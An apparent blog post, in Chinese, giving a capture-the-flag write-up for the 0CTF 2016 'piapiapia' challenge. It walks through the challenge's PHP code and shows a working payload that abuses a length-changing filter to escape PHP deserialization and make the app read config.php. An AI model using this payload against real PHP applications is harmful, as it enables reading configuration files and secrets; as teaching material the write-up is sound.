@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>0ctf2016piapiapia - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=反序列化,writeup>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">0ctf2016piapiapia</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#update-php"><span class="toc-text">update.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#class-php"><span class="toc-text">class.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#profile-php"><span class="toc-text">profile.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化字符逃逸"><span class="toc-text">反序列化字符逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简化后的demo"><span class="toc-text">简化后的demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后的payload"><span class="toc-text">最后的payload</span></a></li></ol>
+
+  <div class="post-content">
+    <ul>
+<li>访问/<a href="http://www.zip得到源码" target="_blank" rel="noopener">www.zip得到源码</a></li>
+</ul>
+<h2 id="update-php"><a href="#update-php" class="headerlink" title="update.php"></a>update.php</h2><ul>
+<li>这里可以更新个人信息<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure></li>
+<li>这里的文件上传后会用MD5重命名,无法直接传马</li>
+<li>nickname的正则可以用数组绕过<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
+数组被当成字符串时会变成”Array”,正则可以匹配成功,这点在后面会用到</li>
+<li>$profile序列化后存入数据库</li>
+</ul>
+<h2 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h2><ul>
+<li>有两个类，都是mysql相关的操作</li>
+<li>后面会用到一个过滤器<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="profile-php"><a href="#profile-php" class="headerlink" title="profile.php"></a>profile.php</h2><ul>
+<li>存在反序列化和一个file_get_contents<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">		header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure></li>
+<li>$profile 从数据库中取出</li>
+<li>没有什么类可以直接反序列化利用，因此思路应该是利用file_get_contents去读文件(可以发现flag在config.php中)</li>
+</ul>
+<h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><ul>
+<li><p>$profile 从数据库取出后经过了刚刚提到的过滤器filter</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>经过filter过滤后字符串长度可能会发生变化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>where存在的话会被替换成hacker，长度增长了1，但是反序列化字符串中记录的长度并没有变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = serialize(<span class="string">'where'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//s:5:"where";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$b = str_replace(<span class="string">'where'</span>,<span class="string">'hacker'</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//s:5:"hacker";</span></span><br></pre></td></tr></table></figure></li>
+<li><p>这时如果进行反序列化的话php依然认为这个字符串只有5个字符，最后的r就逃逸了出去,如果有多个where的话就可以逃逸出多个字符，从而闭合前面的”和{,给$profile注入一个我们想要的$profile[‘photo’]</p>
+</li>
+<li><p>在更新个人信息的时候除了nickname外都有格式的限制，因此利用nickname进行反序列化逃逸</p>
+</li>
+</ul>
+<h2 id="简化后的demo"><a href="#简化后的demo" class="headerlink" title="简化后的demo"></a>简化后的demo</h2><p>简化后的demo如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line"><span class="comment">//原题中nickname要是数组才行</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($profile[<span class="string">'nickname'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'这样不行滴'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($_POST[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">$a = serialize($profile);</span><br><span class="line">$b = str_replace(<span class="string">'where'</span>,<span class="string">'hacker'</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">var_dump(unserialize($b));</span><br></pre></td></tr></table></figure>
+<p>这时如果传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]&#x3D;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&amp;filename&#x3D;test.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>替换后的反序列化字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;93bc3c03503d8768cf7cc1e39ce16fcb&quot;;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nickname被设为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;nickname&#39; &#x3D;&gt; array(1) &#123; [0] &#x3D;&gt; string(204) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>photo则变成了我们指定的config.php</p>
+<blockquote>
+<p>‘photo’ =&gt; string(10) “config.php”</p>
+</blockquote>
+</li>
+<li><p>后面的部分会被php忽略</p>
+</li>
+</ul>
+<h2 id="最后的payload"><a href="#最后的payload" class="headerlink" title="最后的payload"></a>最后的payload</h2><p>更新资料的时候nickname设为数组，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后将profile.php中的图片base64解码后即可得到flag</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-12-18</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
